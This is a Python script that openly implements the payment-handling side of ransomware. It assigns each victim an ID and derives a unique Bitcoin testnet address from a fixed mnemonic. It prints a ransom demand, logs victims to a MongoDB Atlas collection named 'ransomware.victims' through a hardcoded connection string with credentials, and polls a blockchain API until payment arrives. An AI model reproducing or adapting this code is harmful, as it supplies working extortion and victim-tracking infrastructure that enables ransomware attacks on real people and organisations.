import sys
import random
import time
import requests
from pymongo import MongoClient
from bip_utils import (
    Bip39SeedGenerator, Bip84, Bip84Coins, Bip44Changes
)

# === MongoDB Atlas Configuration ===
MONGO_USER = "api_user"
MONGO_PASS = "123"  # Replace with actual password (URL-encoded if needed)
MONGO_URI = f"mongodb+srv://{MONGO_USER}:{MONGO_PASS}@cluster0.0bgddz8.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

client = MongoClient(MONGO_URI)
collection = client["ransomware"]["victims"]

def report_to_mongodb(victim_id, address, amount_sats):
    doc = {
        "victim_id": victim_id,
        "address": address,
        "amount_sats": amount_sats,
        "paid": False,
        "timestamp": time.time()
    }
    try:
        collection.insert_one(doc)
        print("✅ Victim info reported to MongoDB.")
    except Exception as e:
        print(f"⚠️ MongoDB insert error: {e}")

def main():
    victim_id = random.randint(100, 999)
    amount_sats = victim_id * 10
    amount_btc = amount_sats / 1e8

    mnemonic = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()

    bip84_ctx = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN_TESTNET)
    derived = bip84_ctx.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(victim_id)
    address = derived.PublicKey().ToAddress()

    print(f"Your unique victim ID is: {victim_id}")
    print(f"Send at least {amount_btc:.8f} BTC ({amount_sats} sats) to this address:")
    print(f"Address: {address}")

    # Report victim data to MongoDB
    report_to_mongodb(victim_id, address, amount_sats)

    # Monitor payment
    while True:
        try:
            url = f"https://mempool.space/testnet/api/address/{address}"
            response = requests.get(url, timeout=10)

            if response.status_code != 200:
                print(f"Error: received status code {response.status_code}")
                time.sleep(10)
                continue

            data = response.json()
            total_received = data.get("chain_stats", {}).get("funded_txo_sum", 0)
            total_spent = data.get("chain_stats", {}).get("spent_txo_sum", 0)
            net_received = total_received - total_spent

            print(f"Net received: {net_received} sats")

            if net_received > 0:
                print("✅ Payment received!")

                # Update MongoDB document to mark as paid
                try:
                    result = collection.update_one(
                        {"victim_id": victim_id},
                        {"$set": {"paid": True}}
                    )
                    if result.modified_count == 1:
                        print("✅ MongoDB document updated: paid = true.")
                    else:
                        print("⚠️ MongoDB update failed or no matching document.")
                except Exception as e:
                    print(f"⚠️ MongoDB update error: {e}")

                time.sleep(2)
                sys.exit(0)
            else:
                print("Waiting for payment...")

            time.sleep(10)

        except Exception as e:
            print(f"Network error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()
